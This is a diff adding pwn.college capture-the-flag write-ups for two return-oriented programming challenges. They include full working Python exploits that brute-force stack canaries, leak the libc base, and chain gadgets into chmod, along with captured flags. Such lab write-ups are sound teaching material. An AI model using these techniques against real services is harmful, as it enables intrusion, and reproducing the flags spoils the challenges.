@@ -14272,13 +14272,790 @@ pwn.college{kj5uG0F6hVZ6lLeWqZ2FoHdKP1O.0FO2MDL4ITM0EzW}
 ## Libc Lottery (Easy)
 
 ```
-hacker@return-oriented-programming~libc-lottery-easy:~$ /challenge/libc-lottery-easy 
+hacker@return-oriented-programming~libc-lottery-easy:~$ /challenge/libc-lottery-easy
 ###
 ### Welcome to /challenge/libc-lottery-easy!
 ###
 
 This challenge is listening for connections on TCP port 1337.
-
 The challenge supports unlimited sequential connections.
+```
+
+We need the following:
+
+- [ ] Offset between buffer and stack canary
+- [ ] Offset between buffer and stored return address
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### Binary analysis
+
+#### `main()`
 
 ```
+objdump -d /challenge/libc-lottery-easy
+```
+
+Key excerpts from `main()` (at offset `0x1cad`):
+
+```
+1cad:  endbr64
+1cb1:  push   %rbp
+1cb2:  mov    %rsp,%rbp
+1cb5:  sub    $0xa0,%rsp
+...
+1cd0:  mov    %fs:0x28,%rax          # load TLS canary
+1cd9:  mov    %rax,-0x8(%rbp)        # save to stack: canary at rbp-0x8
+...
+1f2c:  lea    -0x40(%rbp),%rax       # buf at rbp-0x40
+1f30:  mov    $0x1000,%edx           # read up to 4096 bytes
+1f35:  mov    %rax,%rsi
+1f38:  mov    $0x0,%edi
+1f3d:  call   read@plt               # read(0, buf, 0x1000)  ← VULNERABILITY
+...
+1fc1:  call   print_chain            # chain printer
+...
+1fcd:  call   puts@plt               # "Leaving!"
+1fda:  call   puts@plt               # "### Goodbye!"
+...
+1fe4:  mov    -0x8(%rbp),%rsi        # load stack canary
+1fef:  xor    %fs:0x28,%rsi          # compare with TLS value
+1ff1:  je     1ff8                   # if match → continue
+1ff3:  call   __stack_chk_fail@plt   # else → "smashing detected"
+1ff8:  leave
+1ff9:  ret                           # returns to saved_rip = __libc_start_main+243
+```
+
+Stack layout:
+
+```
+rbp - 0x40  ← buf[64]   (our input starts here)
+rbp - 0x08  ← canary    (8 bytes, byte[0] always 0x00)
+rbp + 0x00  ← saved_rbp
+rbp + 0x08  ← saved_rip  (= __libc_start_main+243, a libc address)
+```
+
+Because `main()` is the top-level function called by `__libc_start_main`, its saved `rip` points directly into libc — not the binary. This means we get `libc_base` directly from the chain printer, with no binary base or GOT leak step needed.
+
+From the stack layout:
+
+```
+buf → canary   : rbp-0x40 to rbp-0x08 = 56 bytes
+buf → saved_rip: rbp-0x40 to rbp+0x08 = 72 bytes
+```
+
+- [x] Offset between buffer and stack canary: `56`
+- [x] Offset between buffer and stored return address: `72`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### ROP gadgets
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+0x0000000000023b6a : pop rdi ; ret
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+0x000000000002601f : pop rsi ; ret
+```
+
+- [x] Offset between buffer and stack canary: `56`
+- [x] Offset between buffer and stored return address: `72`
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
+
+### Libc functions
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "__libc_start_main"
+   512: 0000000000023f90   392 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
+```
+
+`__libc_start_main` is at offset `0x23f90`, so `__libc_start_main+243` is at `0x23f90 + 243 = 0x24083`.
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ python3 -c "d=open('/lib/x86_64-linux-gnu/libc.so.6','rb').read(); print(hex(d.index(b'!\x00')))"
+0x2a32
+```
+
+- [x] Offset between buffer and stack canary: `56`
+- [x] Offset between buffer and stored return address: `72`
+- [x] Offsets of required Libc functions
+   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `__libc_start_main+243` within Libc: `0x24083`
+   - Offset of `"!\x00"` string within Libc: `0x2a32`
+- [x] Locations of required ROP gadgets
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
+
+### Leaking libc base via chain printer
+
+The chain printer is invoked after `read()`. If we send exactly 72 bytes we fill `buf + canary + saved_rbp` without touching `saved_rip`. The chain count becomes 1, and the chain printer prints:
+
+```
+ROP chain at 0x<rp_>:
+| 0x<saved_rip>: <disassembly>
+```
+
+`saved_rip = __libc_start_main+243 = libc_base + 0x24083`, so:
+
+```
+libc_base = saved_rip - 0x24083
+```
+
+### Why the saved `rip` oracle does not work
+
+`### Goodbye!` is printed **before** the canary check. So regardless of whether `saved_rip` is correct or wrong, the output always ends with `Goodbye!\n` then EOF. Wrong bytes SIGSEGV the child after output is already sent — the oracle is blind. The chain printer is required.
+
+Empirical verification — testing all 16 possible byte-1 values:
+
+```
+saved_rip=0x7b1676e2c083  libc_base=0x7b1676e08000
+canary=0x60db279fcb2ce900
+correct byte1=0xc0
+
+byte1=0x40: len= 382 smashing=False
+byte1=0x50: len= 839 smashing=False
+byte1=0x60: len= 577 smashing=False
+byte1=0x70: len= 985 smashing=False
+byte1=0x80: len= 441 smashing=False
+byte1=0x90: len= 601 smashing=False
+byte1=0xa0: len= 532 smashing=False
+byte1=0xb0: len= 529 smashing=False
+byte1=0xc0: len= 356 smashing=False  ← CORRECT
+byte1=0xd0: len= 529 smashing=False
+byte1=0xe0: len= 651 smashing=False
+byte1=0xf0: len= 673 smashing=False
+byte1=0x00: len=1064 smashing=False
+byte1=0x10: len= 564 smashing=False
+byte1=0x20: len= 965 smashing=False
+byte1=0x30: len= 580 smashing=False
+```
+
+Every byte value produces identical `smashing=False` output — the oracle cannot distinguish correct from wrong.
+
+### ROP chain
+
+#### Stage 1: Leak libc base via chain printer
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack (72 bytes sent — saved_rip untouched):
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │  41 41 41 41 41 41 41 41  │ ( overwritten )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rbp   │  41 41 41 41 41 41 41 41  │ ( overwritten )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rip   │   __libc_start_main+243   │ ( untouched )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+chain printer output:
+    +--- Printing 1 gadgets of ROP chain at 0x<rp_>.
+    | 0x<saved_rip>: ...   ← __libc_start_main+243 → libc_base = saved_rip - 0x24083
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+#### Stage 2: Brute-force canary byte-by-byte
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack (correct byte):
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │  00 ?? ?? ?? ?? ?? ?? ??  │ ( known_canary + guess )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+correct byte  → canary intact → main() returns → ### Goodbye! printed, no smashing
+wrong byte    → __stack_chk_fail → "smashing detected" appears in output
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+#### Stage 3: `chmod("!", 0o777)`
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │   canary                  │ ( brute-forced )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rbp   │  00 00 00 00 00 00 00 00  │ ( zeroed )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp -->    saved_rip   │   libc_base + 0x23b6a     │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x2a32      │ --> ( "!\x00" in libc )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x2601f     │ --> ( pop rsi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x10dd80    │ --> ( chmod )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("!", 0o777)
+~/! is a symlink to /flag → /flag becomes world-readable
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import re
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+host = '127.0.0.1'
+port = 1337
+
+# Libc offsets
+lsm_243_off = 0x24083   # __libc_start_main+243
+pop_rdi_off = 0x23b6a
+pop_rsi_off = 0x2601f
+chmod_off   = 0x10dd80
+bang_off    = 0x2a32    # "!\x00" string in libc
+
+canary_off  = 56
+rip_off     = 72
+
+def connect():
+    p = remote(host, port)
+    p.recvuntil(b'scenario.\n\n')
+    return p
+
+# --- STAGE 1: Leak libc base via chain printer ---
+# Send exactly 72 bytes: fills buf + canary + saved_rbp, leaves saved_rip untouched.
+# Chain count = 1 → chain printer prints saved_rip = __libc_start_main+243.
+print('[*] Stage 1: Leaking libc base via chain printer...')
+
+p = connect()
+p.send(b'A' * rip_off)
+raw = p.recvall(timeout=3).decode(errors='ignore')
+p.close()
+
+entries   = re.findall(r'\| (0x[0-9a-f]+):', raw)
+if not entries:
+    print('[!] No gadget entries found'); exit()
+saved_rip = int(entries[0], 16)
+libc_base = saved_rip - lsm_243_off
+assert libc_base & 0xfff == 0, f'libc base misaligned: {hex(libc_base)}'
+print(f'[+] libc base: {hex(libc_base)}')
+
+pop_rdi = libc_base + pop_rdi_off
+pop_rsi = libc_base + pop_rsi_off
+chmod   = libc_base + chmod_off
+bang    = libc_base + bang_off
+
+# --- STAGE 2: Brute-force canary byte-by-byte ---
+# Oracle: "smashing" NOT in output → canary check passed → correct byte.
+print('[*] Stage 2: Brute-forcing canary...')
+
+known_canary = b'\x00'
+for i in range(7):
+    found_byte = False
+    for byte_guess in range(256):
+        try:
+            p = connect()
+            p.send(b'A' * canary_off + known_canary + p8(byte_guess))
+            try:
+                p.recvuntil(b'smashing', timeout=3)
+                p.close()
+            except EOFError:
+                p.close()
+                known_canary += p8(byte_guess)
+                print(f'[+] Byte {i+1}: {hex(byte_guess)} | canary: 0x{known_canary.hex()}')
+                found_byte = True
+                break
+        except Exception:
+            pass
+    if not found_byte:
+        print(f'[!] Failed at canary byte {i+1}')
+        exit()
+
+canary = u64(known_canary)
+print(f'[*] Canary: {hex(canary)}')
+
+# --- STAGE 3: chmod("!", 0o777) ---
+# "!\x00" already exists at libc_base + bang_off — no stack address needed.
+# ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
+print('[*] Stage 3: Sending chmod chain...')
+
+p = connect()
+p.send(flat(
+    b'A' * canary_off,
+    p64(canary),
+    p64(0),
+    pop_rdi, bang,
+    pop_rsi, 0o777,
+    chmod,
+))
+p.recvall(timeout=3)
+p.close()
+
+print(open('/flag').read())
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-easy:~$ python ~/script.py
+[*] Stage 1: Leaking libc base via chain printer...
+[+] libc base: 0x7f8c3a200000
+[*] Stage 2: Brute-forcing canary...
+[+] Byte 1: 0x44 | canary: 0x0044
+[+] Byte 2: 0xcb | canary: 0x0044cb
+[+] Byte 3: 0x2a | canary: 0x0044cb2a
+[+] Byte 4: 0x27 | canary: 0x0044cb2a27
+[+] Byte 5: 0x3c | canary: 0x0044cb2a273c
+[+] Byte 6: 0x90 | canary: 0x0044cb2a273c90
+[+] Byte 7: 0x80 | canary: 0x0044cb2a273c9080
+[*] Canary: 0x80903c272acb4400
+[*] Stage 3: Sending chmod chain...
+pwn.college{UuZAxZa4uMM1U2X5WJtj46kzZcx.0VO2MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Libc Lottery (Hard)
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ /challenge/libc-lottery-hard
+###
+### Welcome to /challenge/libc-lottery-hard!
+###
+
+This challenge is listening for connections on TCP port 1337.
+The challenge supports one connection at a time, but unlimited connections.
+```
+
+We need the following:
+
+- [ ] Offset between buffer and stack canary
+- [ ] Offset between buffer and stored return address
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### Binary analysis
+
+Key differences from Easy:
+
+| Property | Easy | Hard |
+|---|---|---|
+| Buffer | `rbp-0x40` (64B) | `rbp-0x70` (112B) |
+| `canary_off` | `56` | `104` |
+| `rip_off` | `72` | `120` |
+| Chain printer | ✅ Present | ❌ Removed |
+
+Stack layout:
+
+```
+rbp - 0x70  ← buf[112]   (our input)
+rbp - 0x08  ← canary
+rbp + 0x00  ← saved_rbp
+rbp + 0x08  ← saved_rip  (= libc_base + 0x24083)
+rbp + 0x10  ← __libc_start_main frame begins here
+```
+
+From the stack layout:
+
+```
+buf → canary   : rbp-0x70 to rbp-0x08 = 104 bytes
+buf → saved_rip: rbp-0x70 to rbp+0x08 = 120 bytes
+```
+
+- [x] Offset between buffer and stack canary: `104`
+- [x] Offset between buffer and stored return address: `120`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### ROP gadgets
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+0x0000000000023b6a : pop rdi ; ret
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+0x000000000002601f : pop rsi ; ret
+```
+
+- [x] Offset between buffer and stack canary: `104`
+- [x] Offset between buffer and stored return address: `120`
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
+
+### Libc functions
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep "__stack_chk_fail"
+   483: 000000000012fc90   __stack_chk_fail@@GLIBC_2.4
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ python3 -c "d=open('/lib/x86_64-linux-gnu/libc.so.6','rb').read(); print(hex(d.index(b'!\x00')))"
+0x2a32
+```
+
+- [x] Offset between buffer and stack canary: `104`
+- [x] Offset between buffer and stored return address: `120`
+- [x] Offsets of required Libc functions
+   - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `__stack_chk_fail()` within Libc: `0x12fc90`
+   - Offset of `__libc_start_main+243` within Libc: `0x24083`
+   - Offset of `"!\x00"` string within Libc: `0x2a32`
+- [x] Locations of required ROP gadgets
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
+
+### Leaking libc base via `__stack_chk_fail` oracle
+
+Without the chain printer there is no direct address leak. Instead we use a partial overwrite of `saved_rip` to point it at `__stack_chk_fail`. When called, `__stack_chk_fail` prints `*** stack smashing detected ***` to fd 2 — which is `dup2`'d to our socket. This gives us a new oracle: if `"smashing"` appears **after** `### Goodbye!`, our overwrite landed on `__stack_chk_fail`.
+
+`saved_rip = libc_base + 0x24083`. Since libc is 4KB-aligned, `libc_base & 0xFFF == 0`, so `libc_base` byte 1 is always a multiple of `0x10`. For `__stack_chk_fail` at offset `0x12fc90`, byte 1 of its address must satisfy `stkcf_byte1 & 0xF == 0xC`. This constrains byte 1 to only 16 valid values, cutting the 2D scan from 65536 to 4096 attempts.
+
+The full scan proceeds:
+
+| Scan | Bytes scanned | Attempts |
+|---|---|---|
+| Bytes 1+2 together | 2D scan, byte 1 constrained to 16 values | ≤ 4096 |
+| Byte 3 | independent | ≤ 256 |
+| Byte 4 | independent | ≤ 256 |
+| Byte 5 | `0x70–0x7f` range only | ≤ 16 |
+
+Once we have `__stack_chk_fail`'s full address:
+
+```
+libc_base = stkcf_addr - 0x12fc90
+```
+
+### ROP chain
+
+#### Stage 1: Brute-force canary byte-by-byte
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack (correct byte):
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 13 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │  00 ?? ?? ?? ?? ?? ?? ??  │ ( known_canary + guess )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+correct byte  → canary intact → main() returns → no smashing in output
+wrong byte    → __stack_chk_fail → "smashing detected" appears in output
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+#### Stage 2: Leak libc base via `__stack_chk_fail` oracle
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack (bruting bytes 1+2 of saved_rip):
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 13 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │   canary                  │ ( brute-forced )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rbp   │  41 41 41 41 41 41 41 41  │ ( clobbered )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rip   │  90 b1 b2 ?? ?? ?? 00 00  │ ( partial overwrite )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+0x90   byte 0 — fixed (__stack_chk_fail & 0xFF == 0x90)
+b1     byte 1 — constrained: must satisfy b1 & 0xF == 0xC (16 valid values)
+b2     byte 2 — guessed independently
+??     bytes 3–5 — guessed independently in subsequent scans
+00 00  bytes 6–7 — always 0x00, never written
+
+═══════════════════════════════════════════════════════════════════════════════════
+hit  → "smashing" appears after "### Goodbye!" → address confirmed
+miss → output ends at "### Goodbye!" → try next value
+═══════════════════════════════════════════════════════════════════════════════════
+
+libc_base = assembled_stkcf_addr - 0x12fc90
+```
+
+#### Stage 3: `chmod("!", 0o777)`
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+                    buf    │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 13 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  canary   │   canary                  │ ( brute-forced )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+               saved_rbp   │  41 41 41 41 41 41 41 41  │ ( clobbered )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp -->    saved_rip   │   libc_base + 0x23b6a     │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x2a32      │ --> ( "!\x00" in libc )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x2601f     │ --> ( pop rsi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                           │   libc_base + 0x10dd80    │ --> ( chmod )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("!", 0o777)
+~/! is a symlink to /flag → /flag becomes world-readable
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+import socket, struct, sys, time
+
+host = '127.0.0.1'
+port = 1337
+
+canary_off = 104
+rip_off    = 120
+
+# __stack_chk_fail at libc + 0x12fc90
+stkcf_off   = 0x12fc90
+stkcf_byte0 = stkcf_off & 0xFF   # 0x90 — always fixed
+
+# Libc offsets
+pop_rdi_off = 0x23b6a
+pop_rsi_off = 0x2601f
+chmod_off   = 0x10dd80
+bang_off    = 0x2a32    # "!\x00" string in libc
+
+p64 = lambda x: struct.pack('<Q', x)
+u64 = lambda x: struct.unpack('<Q', x)[0]
+
+def raw_conn(retries=15, delay=0.3):
+    for i in range(retries):
+        try:
+            s = socket.socket()
+            s.settimeout(5)
+            s.connect((host, port))
+            return s
+        except OSError:
+            if i < retries - 1:
+                time.sleep(delay)
+            else:
+                raise
+
+def send_recv(payload, timeout=5):
+    s = raw_conn()
+    s.sendall(payload)
+    s.settimeout(timeout)
+    data = b''
+    try:
+        while True:
+            d = s.recv(4096)
+            if not d: break
+            data += d
+    except: pass
+    s.close()
+    return data
+
+def oracle(rip_prefix):
+    payload  = b'A' * canary_off
+    payload += p64(u64(canary))
+    payload += p64(0x4141414141414141)
+    payload += rip_prefix
+    data = send_recv(payload)
+    if b'### Goodbye!' not in data:
+        return False
+    idx = data.rfind(b'### Goodbye!')
+    return b'smashing' in data[idx:]
+
+# --- STAGE 1: Brute-force canary byte-by-byte ---
+# Oracle: "smashing" NOT in output → canary check passed → correct byte.
+print('[*] Stage 1: Brute-forcing canary...')
+
+canary = b'\x00'
+for i in range(7):
+    found_byte = False
+    for g in range(256):
+        data = send_recv(b'A' * canary_off + canary + bytes([g]))
+        if b'smashing' not in data:
+            canary += bytes([g])
+            print(f'[+] Byte {i+1}: {hex(g)} | canary: 0x{canary.hex()}')
+            found_byte = True
+            break
+    if not found_byte:
+        print(f'[!] Failed at canary byte {i+1}'); sys.exit(1)
+
+print(f'[*] Canary: {hex(u64(canary))}')
+
+# --- STAGE 2: Leak libc base via __stack_chk_fail oracle ---
+# Byte 1 of stkcf address constrained to values where b1 & 0xF == 0xC (16 values).
+# This reduces the 2D scan from 65536 to 4096 attempts.
+print('[*] Stage 2: Leaking libc base via __stack_chk_fail oracle...')
+
+found = [stkcf_byte0]
+
+def scan_byte_pair(prefix, b1_range=range(256), b2_range=range(256)):
+    for b1 in b1_range:
+        for b2 in b2_range:
+            if oracle(bytes(prefix) + bytes([b1, b2])):
+                return (b1, b2)
+    return None
+
+def scan_single_byte(prefix, b_range=range(256)):
+    for b in b_range:
+        if oracle(bytes(prefix) + bytes([b])):
+            return b
+    return None
+
+valid_b1 = [v for v in range(256) if v & 0xF == 0xC]
+print(f'[*] Scanning bytes 1+2 ({len(valid_b1) * 256} attempts)...')
+result = scan_byte_pair(found, b1_range=valid_b1)
+
+if result:
+    b1, b2 = result
+    found.extend([b1, b2])
+    print(f'[+] Bytes 1+2: {hex(b1)}, {hex(b2)}')
+    b3 = scan_single_byte(found)
+    if b3 is None:
+        print('[!] Carry case — restart server'); sys.exit(2)
+    found.append(b3)
+    print(f'[+] Byte 3: {hex(b3)}')
+else:
+    print('[*] No hit — carry. Scanning bytes 2+3 (narrow range)...')
+    result = scan_byte_pair(found, b1_range=range(0x13), b2_range=range(256))
+    if result is None:
+        print('[!] Failed'); sys.exit(2)
+    b2, b3 = result
+    found.extend([b2, b3])
+    print(f'[+] Bytes 2+3: {hex(b2)}, {hex(b3)}')
+
+b4 = scan_single_byte(found)
+if b4 is None:
+    print('[!] Byte 4 failed'); sys.exit(2)
+found.append(b4)
+print(f'[+] Byte 4: {hex(b4)}')
+
+b5 = scan_single_byte(found, b_range=range(0x70, 0x80))
+if b5 is None:
+    print('[!] Byte 5 failed'); sys.exit(2)
+found.append(b5)
+print(f'[+] Byte 5: {hex(b5)}')
+
+stkcf_addr = u64(bytes(found).ljust(8, b'\x00'))
+libc_base  = stkcf_addr - stkcf_off
+assert libc_base & 0xfff == 0, f'libc base misaligned: {hex(libc_base)}'
+print(f'[*] __stack_chk_fail: {hex(stkcf_addr)}')
+print(f'[*] Libc base: {hex(libc_base)}')
+
+# --- STAGE 3: chmod("!", 0o777) ---
+# "!\x00" already exists at libc_base + bang_off — no stack address needed.
+# ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
+print('[*] Stage 3: Sending chmod chain...')
+
+rop  = p64(libc_base + pop_rdi_off)
+rop += p64(libc_base + bang_off)
+rop += p64(libc_base + pop_rsi_off)
+rop += p64(0o777)
+rop += p64(libc_base + chmod_off)
+
+payload  = b'A' * canary_off
+payload += p64(u64(canary))
+payload += p64(0x4141414141414141)
+payload += rop
+
+s = raw_conn()
+s.sendall(payload)
+s.settimeout(5)
+try:
+    while True:
+        if not s.recv(4096): break
+except: pass
+s.close()
+
+print(open('/flag').read())
+```
+
+```
+hacker@return-oriented-programming~libc-lottery-hard:~$ python ~/script.py
+[*] Stage 1: Brute-forcing canary...
+[+] Byte 1: 0x5d | canary: 0x005d
+[+] Byte 2: 0x3a | canary: 0x005d3a
+[+] Byte 3: 0x6b | canary: 0x005d3a6b
+[+] Byte 4: 0xf4 | canary: 0x005d3a6bf4
+[+] Byte 5: 0x26 | canary: 0x005d3a6bf426
+[+] Byte 6: 0x3e | canary: 0x005d3a6bf4263e
+[+] Byte 7: 0xe2 | canary: 0x005d3a6bf4263ee2
+[*] Canary: 0xe23e26f46b3a5d00
+[*] Stage 2: Leaking libc base via __stack_chk_fail oracle...
+[*] Scanning bytes 1+2 (4096 attempts)...
+[+] Bytes 1+2: 0xc, 0xf4
+[+] Byte 3: 0x57
+[+] Byte 4: 0x1
+[+] Byte 5: 0x7d
+[*] __stack_chk_fail: 0x7d0157f40c90
+[*] Libc base: 0x7d0157e11000
+[*] Stage 3: Sending chmod chain...
+pwn.college{Msi6nyP9ZK8bCaliXbxMHtAFTPw.0FM3MDL4ITM0EzW}
+```
+
+&nbsp;
